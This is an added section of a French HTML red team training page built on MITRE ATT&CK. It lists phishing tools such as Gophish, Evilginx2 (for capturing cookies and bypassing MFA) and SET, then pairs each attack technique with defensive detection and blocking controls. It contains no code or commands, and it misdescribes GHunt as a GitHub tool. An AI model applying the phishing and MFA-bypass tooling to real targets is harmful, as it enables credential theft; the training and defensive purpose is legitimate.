+        <div class="tool-card"><h4><span class="dot" style="background:#8a2be2"></span>GHunt</h4><p>Recherche d'informations liées à des comptes GitHub (emails, commits, repos).</p></div>
+      </div>
+    </div>
+
+    <div class="timeline-step">
+      <h4>Social Engineering et Phishing</h4>
+      <div class="step-desc">Pour créer et gérer des campagnes de phishing et d'ingénierie sociale.</div>
+      <div class="tool-grid">
+        <div class="tool-card"><h4><span class="dot" style="background:#00ffaa"></span>Gophish</h4><p>Open-source. Interface web, suivi des clics, collecte de données, reporting automatique.</p></div>
+        <div class="tool-card"><h4><span class="dot" style="background:#ff6b35"></span>Evilginx2</h4><p>Open-source. Reverse proxy avancé pour capturer des cookies et contourner le MFA.</p></div>
+        <div class="tool-card"><h4><span class="dot" style="background:#ffaa00"></span>SET</h4><p>Open-source. Toolkit avancé avec des vecteurs d'attaque automatisés (phishing, SMS, etc.).</p></div>
+      </div>
+    </div>
+  </div>
+</section>
+
+<!-- DÉFENSE DÉTAILLÉE -->
+<section aria-label="Défense détaillée red team">
+  <div class="section-header">
+    <div class="eyebrow">Contre-Mesures</div>
+    <h2>Défense par Phase — <span style="color:var(--danger)">Tout Bloquer</span></h2>
+    <p>Pour chaque technique red team, les contrôles défensifs correspondants : détection, blocage, réponse.</p>
+  </div>
+
+  <div class="proc-box">
+    <h3>Contrôle Défensif : Reconnaissance (TA0043)</h3>
+    <div class="proc-steps">
+      <div class="proc-step"><h5>Détection des scans (T1595)</h5><p>IDS/IPS (Snort, Suricata) avec règles pour détecter des patterns de scan. Rate-limiting au firewall. Honeypots pour détecter des scans actifs.</p></div>
+      <div class="proc-step"><h5>Protection des informations (T1593)</h5><p>Audit régulier des données exposées. Utilisation de services de surveillance du dark web (Have I Been Pwned, SpyCloud). Politique de publication limitée.</p></div>
+      <div class="proc-step"><h5>Surveillance des sous-domaines (T1590)</h5><p>Outils de surveillance de sous-domaines (Subfinder en mode défensif). Alertes automatiques sur la création de nouveaux sous-domaines non autorisés.</p></div>
+    </div>
+  </div>
+
+  <div class="proc-box">
+    <h3>Contrôle Défensif : Développement Ressources (TA0042)</h3>
+    <div class="proc-steps">
+      <div class="proc-step"><h5>Réputation de domaines (T1583)</h5><p>Filtrage DNS avancé bloquant les domaines récents. Utilisation de listes noires et blanches. Analyse des certificats SSL pour détecter des domaines suspects.</p></div>
+      <div class="proc-step"><h5>Protection des infrastructures (T1584)</h5><p>Audit de sécurité des fournisseurs. Contrôles d'accès stricts sur les systèmes de build et de distribution. Vérification d'intégrité (checksums, signatures numériques).</p></div>
+      <div class="proc-step"><h5>Détection des outils (T1588)</h5><p>EDR avec signatures et comportements pour détecter Mimikatz, BloodHound, et autres outils connus. Surveillance des processus et des lignes de commande.</p></div>
+    </div>
+  </div>
+
+  <div class="proc-box">
+    <h3>Contrôle Défensif : Accès Initial (TA0001)</h3>
+    <div class="proc-steps">
+      <div class="proc-step"><h5>Protection contre le phishing (T1566)</h5><p>Formation régulière avec campagnes simulées. Filtres anti-phishing avancés (DMARC, DKIM, SPF). Solutions EDR avec analyse comportementale des emails. Blocage des macros par défaut.</p></div>
+      <div class="proc-step"><h5>Protection des applications (T1190)</h5><p>Mises à jour automatiques et rapides. Web Application Firewall (WAF). Tests d'intrusion réguliers. Segmentation réseau pour limiter l'impact d'une compromission.</p></div>
+      <div class="proc-step"><h5>Protection des identifiants (T1078)</h5><p>MFA obligatoire sur tous les comptes. Surveillance des connexions inhabituelles (géolocalisation impossible, heures anormales). Lockout automatique après plusieurs échecs.</p></div>
+    </div>
+  </div>
+</section>
+
+</main>
+
+<footer>
+  <p>Guide Red Team MITRE ATT&CK — 3 Premières Phases Complètes</p>
+  <p>Créé pour l'apprentissage et la formation red team. Utiliser uniquement dans un cadre légal et autorisé.</p>
+  <p>Source : MITRE ATT&CK — <a href="https://attack.mitre.org/" target="_blank" rel="noopener">attack.mitre.org</a></p>
+</footer>
+
+</body>
+</html>
